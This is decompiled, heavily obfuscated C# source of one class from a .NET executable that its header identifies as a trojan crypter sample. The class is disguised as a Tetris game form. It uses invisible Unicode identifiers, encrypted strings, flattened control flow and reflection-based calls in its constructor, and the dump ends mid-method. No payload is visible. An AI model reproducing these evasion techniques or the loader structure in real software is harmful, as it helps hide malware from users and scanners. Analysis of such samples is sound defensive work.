// Decompiled with JetBrains decompiler
// Type: SMALLR.Descriptors.ThreadOrderDescriptor
// Assembly: SMALLR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D2A6844-DF52-4C3E-A39E-6BCAB729CFBF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-cb64837983ad6cdbc07df3dc8272a72b4d1b41314b797cc4f9bb67cd37f7b0f5.exe

using SMALLR.Adapter;
using SMALLR.Classes;
using SMALLR.Consumers;
using SMALLR.Expressions;
using SMALLR.Messages;
using SMALLR.Records;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Tetris.Managers;
using Tetris.Objects;
using Tetris.Producers;

namespace SMALLR.Descriptors
{
  public class ThreadOrderDescriptor : AccountValueRecord
  {
    private int _Container;
    private IContainer _Object;
    private static string m_Initializer;
    private static string _Status;
    private static string product;
    private static string _Policy;
    private static string m_Order;
    private static string m_Worker;
    private static string m_Ref;
    private static string m_Model;
    private static string m_Error;
    private static string m_Parser;
    private static string _Task;
    private static string _Client;
    private static string m_Repository;
    private string val;
    private static object m_Request;
    private Label _Specification;
    private Panel m_Token;
    private Label map;
    private PictureBox _Adapter;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ThreadOrderDescriptor()
    {
      int num1 = 7;
      while (true)
      {
        int num2 = num1;
        string[] strArray;
        PropertyInfo propertyInfo;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              strArray[2] = \u003CModule\u003E.\u200B‮‭‏‪‌‮‎‍‬‪‭‏​​‬⁬⁭‍‬‪‭⁬⁫‮​​⁯‫​‍‍⁫‮‪‎⁫‌‪⁪‮<string>(2916424793U);
              ThreadOrderDescriptor.\u202A‭‌⁭‬‫‍​⁭⁯‬‫⁫‮‏⁮‏‮​⁪‬‪‌‎‏⁬‌‪‏⁮​‌‍‏⁬⁯‪‌​‬‮(propertyInfo, (object) null, (object) strArray, (object[]) null);
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto case 7;
            case 1:
            case 2:
              this.val = "";
              if (ThreadOrderDescriptor.FlushPrototype())
              {
                num2 = 9;
                continue;
              }
              goto case 3;
            case 3:
              this.StopAttr();
              num2 = 4;
              continue;
            case 4:
              goto label_3;
            case 6:
              propertyInfo = ThreadOrderDescriptor.\u202E‎⁮⁬‎‫⁯‌⁪⁭‬‪​‎⁭‪‎‎‮‏⁭​⁭⁪⁬‭‮‫‬‎‌‫‮‮‎‎‮‍‮‪‮((System.Type) ThreadOrderDescriptor.m_Request)[0];
              strArray = new string[3]
              {
                \u003CModule\u003E.\u200B‮‭‏‪‌‮‎‍‬‪‭‏​​‬⁬⁭‍‬‪‭⁬⁫‮​​⁯‫​‍‍⁫‮‪‎⁫‌‪⁪‮<string>(2196076542U),
                null,
                null
              };
              num2 = 8;
              continue;
            case 7:
              this._Object = (IContainer) null;
              num2 = 2;
              continue;
            case 8:
              strArray[1] = \u003CModule\u003E.\u202C‍​‭​⁮‮⁫‎⁪⁯‮‏‏‌⁫‌⁬‬⁮‭‫⁪​⁫‌‏⁫​‮⁬‪‮⁯⁬⁭⁭⁭⁭⁫‮<string>(3156156712U);
              goto case 0;
            case 9:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              this.MoveAttr();
              num2 = 6;
              continue;
            case 10:
              goto label_13;
            default:
              goto label_10;
          }
        }
label_3:
        this.LoginAttr();
        num1 = 10;
        continue;
label_10:
        num1 = 0;
      }
label_13:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public FieldPropertyExpression LogoutAttr() => this.value;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ReflectAttr(FieldPropertyExpression instance) => this.value = instance;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public CallbackStatusConsumer RegisterAttr() => this._Reponse;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitAttr(CallbackStatusConsumer info) => this._Reponse = info;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public List<PagePolicyMessage> VerifyAttr() => this.m_Instance;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PostAttr(List<PagePolicyMessage> config) => this.m_Instance = config;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public PagePolicyMessage AssetAttr() => this._Algo;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ChangeAttr(PagePolicyMessage spec) => this._Algo = spec;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool ComputeAttr() => this.m_Property;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PrepareAttr(bool deletespec) => this.m_Property = deletespec;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CollectAttr(object item, EventArgs map)
    {
label_1:
      int num1 = 412406375;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1888165191)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.RegisterServer();
            num1 = (int) num2 * 1148275049 ^ -1262463552;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StopAttr()
    {
      int num1 = 2;
label_1:
      int num2 = -764180505;
      while (true)
      {
        uint num3;
        Size size;
        string str;
        int num4;
        switch ((num3 = (uint) (num2 ^ -1180074017)) % 11U)
        {
          case 0:
label_16:
            this.PostAttr(new List<PagePolicyMessage>()
            {
              (PagePolicyMessage) new Tetris.Pages.Message(this.LogoutAttr().ConnectServer(), size),
              (PagePolicyMessage) new Issuer(this.LogoutAttr().SortServer(), size),
              (PagePolicyMessage) new Comparator(this.LogoutAttr().CollectServer(), size),
              (PagePolicyMessage) new DatabaseServerManager(this.LogoutAttr().QueryServer(), size),
              (PagePolicyMessage) new RegInstanceAdapter(this.LogoutAttr().RestartServer(), size),
              (PagePolicyMessage) new ResolverInstanceAdapter(this.LogoutAttr().OrderServer(), size),
              (PagePolicyMessage) new CustomerPolicyMessage(this.LogoutAttr().LogoutServer(), size)
            });
            num1 = 6;
            goto case 10;
          case 1:
            num1 = 2;
            num2 = (int) num3 * -1743317139 ^ -161531126;
            continue;
          case 2:
            goto label_1;
          case 3:
            num2 = (int) num3 * -68885158 ^ -1986358491;
            continue;
          case 5:
            size = new Size(40, 40);
            num2 = (int) num3 * -1301444610 ^ -910337916;
            continue;
          case 6:
label_4:
            FieldPropertyExpression instance = new FieldPropertyExpression();
            instance.ValidateServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u202C‍​‭​⁮‮⁫‎⁪⁯‮‏‏‌⁫‌⁬‬⁮‭‫⁪​⁫‌‏⁫​‮⁬‪‮⁯⁬⁭⁭⁭⁭⁫‮<string>(1830478708U))));
            instance.InstantiateServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u206D‍⁮‌‬⁬‬⁬⁪‪⁬‫‬⁮‪‮⁮‭⁭‍‍‭⁫‍⁮‫‮⁭⁮‭⁬‎‫⁭‫⁯‫‌⁬⁮‮<string>(3894452010U))));
            instance.StopServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u202C‍​‭​⁮‮⁫‎⁪⁯‮‏‏‌⁫‌⁬‬⁮‭‫⁪​⁫‌‏⁫​‮⁬‪‮⁯⁬⁭⁭⁭⁭⁫‮<string>(3820143546U))));
            instance.RateServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(961671189U))));
            instance.CreateServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(2818879667U))));
            instance.VisitServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u206D‍⁮‌‬⁬‬⁬⁪‪⁬‫‬⁮‪‮⁮‭⁭‍‍‭⁫‍⁮‫‮⁭⁮‭⁬‎‫⁭‫⁯‫‌⁬⁮‮<string>(190607377U))));
            instance.ReflectServer(this.PostServer(ThreadOrderDescriptor.\u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮(str, \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(4031071465U))));
            this.ReflectAttr(instance);
            num2 = -148342029;
            continue;
          case 7:
            num1 = 5;
            num2 = (int) num3 * -1481983253 ^ -1447673413;
            continue;
          case 8:
            num2 = (int) num3 * 4074326 ^ -2002669679;
            continue;
          case 9:
label_13:
            num2 = -957596814;
            continue;
          case 10:
            num4 = num1;
            break;
          default:
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num4 = 3;
              break;
            }
            goto label_15;
        }
label_10:
        switch (num4)
        {
          case 0:
          case 2:
            break;
          case 1:
          case 4:
            goto label_4;
          case 3:
            goto label_13;
          case 5:
            goto label_16;
          case 6:
            goto label_12;
          default:
            num2 = -395159483;
            continue;
        }
label_15:
        str = ThreadOrderDescriptor.\u206C‭‬⁭⁬⁪⁪‍‪‌‌‪⁬‬⁭⁭⁪‏⁭⁯⁮‌‌‮‎⁯⁮​​‫‍⁭⁯‍‫‎‭⁬⁭⁫‮(ThreadOrderDescriptor.\u200E‭‎‍⁫‮‎⁯‎‏⁫⁮⁯‌‬‭​​⁫‭⁮‭⁮‭‏⁫‌‏‮⁫‮⁬‬‬⁯​​⁪⁫‪‮(ThreadOrderDescriptor.\u202C​​​‫⁫⁪‏​‫‎⁯⁯‭‍⁭‫​‪‮‬‌⁮‪‭⁬​‌⁬‌‎⁮⁭⁪​⁮‬⁭‬‌‮()), \u003CModule\u003E.\u206D‍⁮‌‬⁬‬⁬⁪‪⁬‫‬⁮‪‮⁮‭⁭‍‍‭⁫‍⁮‫‮⁭⁮‭⁬‎‫⁭‫⁯‫‌⁬⁮‮<string>(1124355477U));
        num4 = 4;
        goto label_10;
      }
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void LoginAttr()
    {
      int num1 = 6;
      if (!ThreadOrderDescriptor.ViewPrototype())
        goto label_3;
label_1:
      Size size;
      ThreadOrderDescriptor.\u206E⁯⁬⁫⁮‎‌‪‪⁯‍​‫​⁭‫⁯‎‫‭‎⁫​​‌⁯‮‪⁬‪‪‭‭⁯‪‫‫‪⁯‎‮((Control) this, size = ThreadOrderDescriptor.\u200E⁮‫‌‪​⁮⁯⁯‍‭⁪⁭​⁪‌⁮‍‌‭‍‌​⁯⁫‌‮‌⁯​‪‭‌‏​‬‪‍‌⁭‮((Form) this));
      ThreadOrderDescriptor.\u200B​‭‭‏‭‍‪⁪⁮⁯⁮‬⁫‮‍⁯‭⁬⁯⁯‌‍‫⁯‪⁬​‫‍⁭‮⁮‍‍‭‭‬⁯‏‮((Control) this, size);
      goto label_7;
label_2:
      int num2;
      num1 = num2;
label_3:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_8;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            this.InitAttr(new CallbackStatusConsumer(this.LogoutAttr()));
            num1 = 3;
            continue;
          case 7:
            goto label_9;
          default:
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num1 = 5;
              continue;
            }
            goto label_5;
        }
      }
label_9:
      return;
label_5:
      this.PrepareAttr(true);
      num2 = 7;
      goto label_2;
label_8:
      int width = ThreadOrderDescriptor.\u206B⁫‮‬‎‏‍⁯⁫‌‍‫⁪⁬⁫‎‭⁭‪⁭‪‮‌‍⁫⁬⁭‮‌⁪⁯⁪‎‌⁪‬⁭‬‪⁯‮((Control) this);
      size = this.RegisterAttr().RevertAttr();
      int height1 = size.Height;
      size = this.RegisterAttr().CancelAttr();
      int height2 = size.Height;
      int height3 = height1 * height2;
      ThreadOrderDescriptor.\u202B⁯‏⁪⁫⁯⁬‏⁮⁫‭⁫‏‌‎⁯⁫⁮‮​‌⁮‪⁬⁮⁬‬‎‎⁭​‬⁯⁫‍⁬‬‮⁭⁪‮((Form) this, new Size(width, height3));
      num2 = 0;
      goto label_2;
label_7:
      this.ChangeAttr((PagePolicyMessage) null);
      num2 = 4;
      goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void QueryAttr()
    {
      int num1 = 7;
      if (true)
        goto label_5;
label_1:
      int num2 = (int) ThreadOrderDescriptor.\u202D‍‏‫‭‫⁫‎​‎⁬⁯⁭‬‏‪‫⁭⁯‫‌‎​⁫‎⁬⁯⁮‌​‮⁪‍‍‭⁮⁭‬⁮‏‮(\u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(4211095263U));
      num1 = 9;
label_5:
      while (true)
      {
        bool flag;
        int num3;
        Random random;
        int num4;
        switch (num1)
        {
          case 0:
            this.PrepareAttr(false);
            if (!ThreadOrderDescriptor.ViewPrototype())
            {
              num1 = 8;
              continue;
            }
            goto label_19;
          case 1:
          case 2:
label_12:
            if (flag)
            {
              num4 = 1140104632;
              break;
            }
            goto label_15;
          case 3:
            this.AssetAttr().FindAttr(new Point(this.RegisterAttr().RevertAttr().Width / 2 - this.AssetAttr().SetupAttr().Width / 2, 0));
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num1 = 4;
              continue;
            }
            goto case 0;
          case 4:
            this.AssetAttr().PublishAttr();
            if (!this.RegisterAttr().CompareAttr(this.AssetAttr(), Point.Empty) && !this.RegisterAttr().CompareAttr(this.AssetAttr(), new Point(0, 1)))
              goto label_20;
            else
              goto case 0;
          case 5:
label_8:
            this.ChangeAttr(this.VerifyAttr()[ThreadOrderDescriptor.\u206E⁭‫‭⁫⁬⁯‪⁮⁮‎‮⁬⁭‏‌‌⁫‏‪‪‪⁮‫‭‎⁪‪‌‫⁭‌‏‮⁬‏⁪⁮‮‭‮(random, 0, 7)]);
            num3 = 3;
            num4 = 1768446130;
            break;
          case 6:
          case 8:
            goto label_1;
          case 7:
            flag = this.AssetAttr() == null;
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num1 = 2;
              continue;
            }
            goto case 4;
          case 9:
label_11:
            this.LoginAttr();
            num4 = 2075722564;
            break;
          case 10:
            goto label_19;
          default:
label_6:
            num4 = 1718172922;
            break;
        }
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) (num4 ^ 2090384161)) % 11U)
          {
            case 0:
              goto label_11;
            case 1:
            case 2:
            case 4:
              goto label_4;
            case 3:
              num4 = (int) num5 * 926571018 ^ 706854612;
              continue;
            case 5:
              goto label_8;
            case 7:
              random = ThreadOrderDescriptor.\u200B‪⁪⁪​‌‭‮⁪‍‫‮‎⁬‍‏‌‏​‍‍‭⁯​‬‎⁯‎‪‍‮⁫⁭⁭⁯‪‌‬‮‭‮(DateTime.Now.Millisecond);
              num3 = 5;
              num4 = (int) num5 * 1302081875 ^ -1378025251;
              continue;
            case 8:
              num3 = 0;
              num4 = (int) num5 * 1046724156 ^ 1431817300;
              continue;
            case 9:
              goto label_6;
            case 10:
              goto label_12;
            default:
              goto label_16;
          }
        }
label_4:
        num1 = num3;
        continue;
label_16:
        num1 = 10;
      }
label_15:
      return;
label_19:
label_20:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RateAttr()
    {
      int num1 = 5;
label_12:
      while (true)
      {
        int num2 = num1;
        bool flag1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
              goto label_15;
            case 1:
            case 3:
label_3:
              if (flag1)
              {
                num3 = -265865833;
                break;
              }
              goto label_19;
            case 2:
              goto label_11;
            case 4:
              goto label_20;
            case 5:
label_6:
              num3 = -442000073;
              break;
            case 6:
              goto label_10;
            case 7:
label_7:
              num3 = -707694097;
              break;
            case 8:
              goto label_21;
            default:
              num3 = -1965245793;
              break;
          }
          while (true)
          {
            uint num4;
            switch ((num4 = (uint) (num3 ^ -769831750)) % 10U)
            {
              case 0:
                goto label_6;
              case 1:
                goto label_8;
              case 2:
                goto label_9;
              case 3:
                num1 = 0;
                num3 = (int) num4 * -671190368 ^ -28533004;
                continue;
              case 4:
                goto label_7;
              case 5:
                goto label_3;
              case 6:
                goto label_12;
              case 7:
                this.RestartAttr();
                num3 = (int) num4 * 1969789978 ^ -729399914;
                continue;
              case 8:
                num3 = -850449769;
                continue;
              default:
                goto label_17;
            }
          }
label_9:
          if (true)
          {
            num2 = 8;
            continue;
          }
          goto label_10;
label_17:
          int num5 = 4;
          num2 = ThreadOrderDescriptor.ViewPrototype() ? num5 : num5;
        }
label_8:
        flag1 = this.AssetAttr() == null;
        num1 = 3;
        continue;
label_10:
        bool flag2;
        if (!flag2)
          break;
        goto label_20;
label_19:
        flag2 = this._Container >= 500;
        num1 = 6;
        continue;
label_20:
        this._Container = 0;
        PagePolicyMessage pagePolicyMessage = this.AssetAttr();
        Point point = this.AssetAttr().CountAttr();
        int x = point.X;
        point = this.AssetAttr().CountAttr();
        int y = point.Y + 1;
        Point init = new Point(x, y);
        pagePolicyMessage.FindAttr(init);
        num1 = 7;
      }
      return;
label_15:
      return;
label_11:
      return;
label_21:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DefineAttr(int insert_ITEMAt)
    {
      int num1 = 15;
label_1:
      int num2 = 175057926;
      while (true)
      {
        uint num3;
        Point asset;
        bool flag1;
        bool flag2;
        Point init;
        int index1;
        Point point;
        bool flag3;
        int num4;
        switch ((num3 = (uint) (num2 ^ 27028882)) % 19U)
        {
          case 1:
            goto label_33;
          case 2:
            this.RestartAttr();
            num1 = 16;
            goto case 11;
          case 3:
            int num5 = flag1 ? 1770137303 : (num5 = 408892399);
            num2 = num5 ^ (int) num3 * 1374155856;
            continue;
          case 4:
label_24:
            flag3 = point.X + insert_ITEMAt < 0;
            num2 = 183677661;
            continue;
          case 5:
            if (true)
            {
              num4 = 13;
              goto label_19;
            }
            else
              break;
          case 6:
            num2 = (int) num3 * 1143399651 ^ 2010591288;
            continue;
          case 7:
label_29:
            ++index1;
            num2 = 2041721;
            continue;
          case 8:
            goto label_32;
          case 9:
            goto label_1;
          case 10:
            this.AssetAttr().FindAttr(init);
            num2 = (int) num3 * -2119878285 ^ -1860036981;
            continue;
          case 11:
          case 13:
label_18:
            num4 = num1;
            goto label_19;
          case 12:
label_4:
            flag1 = this.RegisterAttr().PrintAttr(asset);
            num2 = 1658158853;
            continue;
          case 14:
            num2 = 980726790;
            continue;
          case 15:
            num1 = 6;
            num2 = (int) num3 * -413269252 ^ 561176658;
            continue;
          case 16:
label_27:
            point = this.AssetAttr().CountAttr();
            num2 = (int) num3 * -1150978276 ^ -1726685662;
            continue;
          case 17:
            num1 = 7;
            goto case 11;
          case 18:
label_25:
            if (flag2)
            {
              index1 = 0;
              goto label_41;
            }
            else
            {
              num2 = 1155035386;
              continue;
            }
          default:
            num4 = 0;
            goto label_19;
        }
label_6:
        int index2;
        int num6 = index2;
        Size size = this.AssetAttr().SetupAttr();
        int height = size.Height;
        flag2 = num6 < height;
        if (true)
        {
          num4 = 11;
          goto label_19;
        }
label_7:
        bool flag4;
        if (flag4)
        {
          asset = new Point(init.X + index1, init.Y + index2);
          if (true)
          {
            num4 = 3;
            goto label_19;
          }
        }
        else
          goto label_29;
label_9:
        bool flag5;
        if (!flag5)
        {
          ref Point local = ref init;
          int x = this.AssetAttr().CountAttr().X + insert_ITEMAt;
          point = this.AssetAttr().CountAttr();
          int y = point.Y;
          local = new Point(x, y);
          num1 = 10;
          goto label_18;
        }
        else
          goto label_34;
label_19:
        bool flag6;
        while (true)
        {
          switch (num4)
          {
            case 0:
              goto label_7;
            case 1:
              goto label_42;
            case 2:
              int x1 = point.X;
              size = this.AssetAttr().SetupAttr();
              int width1 = size.Width;
              int num7 = x1 + width1 + insert_ITEMAt;
              size = this.RegisterAttr().RevertAttr();
              int width2 = size.Width;
              flag5 = num7 > width2;
              num4 = 8;
              continue;
            case 3:
            case 9:
              goto label_4;
            case 4:
            case 6:
              if (!flag3)
              {
                point = this.AssetAttr().CountAttr();
                num4 = 2;
                continue;
              }
              goto label_10;
            case 5:
              goto label_21;
            case 7:
              goto label_24;
            case 8:
              goto label_9;
            case 10:
              goto label_15;
            case 11:
              goto label_25;
            case 12:
              goto label_6;
            case 13:
              goto label_41;
            case 14:
              goto label_12;
            case 15:
              flag6 = this.AssetAttr() == null;
              if (true)
              {
                num4 = 14;
                continue;
              }
              goto label_15;
            case 16:
              goto label_44;
            default:
              goto label_20;
          }
        }
label_12:
        if (flag6)
        {
          num1 = 5;
          goto label_18;
        }
        else
          goto label_27;
label_15:
        index2 = 0;
        goto label_6;
label_20:
        num2 = 495304944;
        continue;
label_41:
        int num8 = index1;
        size = this.AssetAttr().SetupAttr();
        int width3 = size.Width;
        bool flag7 = num8 < width3;
        if (true)
        {
          num4 = 1;
          goto label_19;
        }
label_42:
        if (flag7)
        {
          flag4 = this.AssetAttr().NewAttr()[index2, index1] > 0;
          goto label_7;
        }
        else
        {
          ++index2;
          num1 = 12;
          goto label_18;
        }
      }
label_33:
      return;
label_32:
      return;
label_34:
      return;
label_21:
      return;
label_10:
      return;
label_44:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RestartAttr()
    {
      int num1 = 3;
      if (ThreadOrderDescriptor.ViewPrototype())
        ;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 3:
            if (this.AssetAttr() == null)
            {
              num3 = 0;
              break;
            }
            num2 = 5;
            goto label_7;
          case 1:
            this.RegisterAttr().PatchAttr();
            num2 = 6;
            goto label_7;
          case 2:
          case 4:
            this.RegisterAttr().ResolveAttr(this.AssetAttr());
            goto case 1;
          case 5:
            num3 = this.RegisterAttr().CompareAttr(this.AssetAttr(), new Point(0, 1)) ? 1 : 0;
            break;
          case 6:
            this.ChangeAttr((PagePolicyMessage) null);
            num2 = 7;
            goto label_7;
          case 7:
            goto label_10;
          default:
            int num4 = 1;
            num1 = ThreadOrderDescriptor.ViewPrototype() ? num4 : num4;
            continue;
        }
        if (num3 != 0)
          num2 = 4;
        else
          break;
label_7:
        num1 = num2;
      }
      return;
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CreateAttr()
    {
      int num1 = 1;
      if (true)
        goto label_6;
label_4:
      bool flag = this.AssetAttr() != null;
      goto label_8;
label_5:
      int num2;
      num1 = num2;
label_6:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
            goto label_4;
          case 3:
          case 5:
            goto label_8;
          case 4:
            goto label_3;
          case 6:
            goto label_1;
          default:
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num1 = 5;
              continue;
            }
            goto label_8;
        }
      }
label_3:
      this.RestartAttr();
      num2 = 2;
      goto label_5;
label_1:
      return;
label_8:
      if (flag)
      {
        PagePolicyMessage pagePolicyMessage = this.AssetAttr();
        Point point = this.AssetAttr().CountAttr();
        int x = point.X;
        point = this.AssetAttr().CountAttr();
        int y = point.Y + 1;
        Point init = new Point(x, y);
        pagePolicyMessage.FindAttr(init);
        num2 = 4;
        goto label_5;
      }
      else
      {
        num1 = 6;
        goto label_6;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Update(VisitorValueProducer setup)
    {
      int num1 = 14;
label_1:
      int num2 = 69165054;
      while (true)
      {
        uint num3;
        bool flag1;
        bool flag2;
        int num4;
        switch ((num3 = (uint) (num2 ^ 1520338572)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
label_6:
            flag2 = this.ChangeServer().ForgotServer();
            num4 = 1;
            if (ThreadOrderDescriptor.ViewPrototype())
              break;
            break;
          case 2:
label_4:
            if (flag1)
            {
              num2 = 617894809;
              continue;
            }
            goto label_31;
          case 3:
          case 4:
label_25:
            num4 = num1;
            break;
          case 6:
            num1 = 3;
            num2 = (int) num3 * -1658673998 ^ -2016676633;
            continue;
          default:
            if (true)
            {
              num4 = 13;
              break;
            }
            goto label_30;
        }
label_26:
        bool flag3;
        while (true)
        {
          switch (num4)
          {
            case 0:
            case 14:
              goto label_15;
            case 1:
              if (!flag2)
              {
                if (this.ChangeServer().SetupServer())
                {
                  this.DefineAttr(-1);
                  if (ThreadOrderDescriptor.FlushPrototype())
                  {
                    num4 = 8;
                    continue;
                  }
                  goto label_13;
                }
                else
                  goto label_21;
              }
              else
                goto label_10;
            case 2:
              goto label_22;
            case 3:
              goto label_30;
            case 4:
              if (flag3)
              {
                this.RegisterAttr().InsertAttr(this.AssetAttr(), -1);
                num4 = 7;
                continue;
              }
              goto label_24;
            case 5:
              goto label_16;
            case 6:
            case 7:
              goto label_23;
            case 8:
            case 9:
              goto label_31;
            case 10:
              goto label_13;
            case 11:
              goto label_4;
            case 12:
              goto label_6;
            case 13:
              goto label_7;
            case 15:
              goto label_32;
            default:
              goto label_27;
          }
        }
label_7:
        bool flag4;
        if (flag4)
        {
          this.RegisterAttr().InsertAttr(this.AssetAttr(), 1);
          num1 = 10;
          goto label_25;
        }
        else
        {
          flag1 = this.ChangeServer().ListServer();
          num1 = 11;
          goto label_25;
        }
label_10:
        this.DefineAttr(1);
        goto label_31;
label_13:
        this.RestartAttr();
        goto label_31;
label_15:
        bool flag5 = !this.ComputeAttr();
        num1 = 5;
        goto label_25;
label_16:
        if (!flag5)
        {
          this._Container += setup.ReadServer();
          num1 = 12;
          goto label_25;
        }
        else
          break;
label_21:
        flag3 = this.ChangeServer().ResolveServer();
        num1 = 4;
        goto label_25;
label_22:
        this.RateAttr();
        num1 = 15;
        goto label_25;
label_23:
        this.RestartAttr();
        goto label_31;
label_24:
        flag4 = this.ChangeServer().PatchServer();
        goto label_7;
label_27:
        num2 = 1609124111;
        continue;
label_30:
        this.CreateAttr();
        num1 = 9;
        goto label_25;
label_31:
        ThreadOrderDescriptor.\u206D‭⁬‍⁬‪⁫‫‬‬​‮​‪‍‭⁬​⁬⁫​‌‭⁬⁭⁭‌‮‏‭‍⁮‫‭‭‎⁬⁮‬⁮‮((Control) this.map, this.RegisterAttr().Lines.ToString());
        this.QueryAttr();
        num4 = 2;
        goto label_26;
      }
      return;
label_32:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override void Draw(Mock var1)
    {
      int num1 = 2;
label_1:
      int num2 = -428584594;
      while (true)
      {
        uint num3;
        bool flag;
        int num4;
        switch ((num3 = (uint) (num2 ^ -1807116497)) % 7U)
        {
          case 0:
            num1 = 4;
            goto case 1;
          case 1:
label_10:
            num4 = num1;
            goto label_11;
          case 2:
            goto label_1;
          case 3:
            goto label_15;
          case 4:
label_4:
            num2 = -1069414623;
            continue;
          case 5:
label_13:
            flag = this.AssetAttr() != null;
            num2 = -381476352;
            continue;
          case 6:
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num4 = 5;
              goto label_11;
            }
            else
              break;
          default:
            goto label_3;
        }
label_6:
        this.RegisterAttr().Draw(var1);
        num1 = 1;
        goto label_10;
label_11:
        while (true)
        {
          switch (num4)
          {
            case 0:
            case 2:
              goto label_6;
            case 1:
              goto label_13;
            case 3:
            case 4:
              this.AssetAttr().Draw(var1);
              num4 = 6;
              continue;
            case 5:
              if (!flag)
                goto label_9;
              else
                goto case 3;
            case 6:
              goto label_4;
            default:
              goto label_12;
          }
        }
label_12:
        num2 = -430940683;
      }
label_15:
      return;
label_3:
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool hasreference)
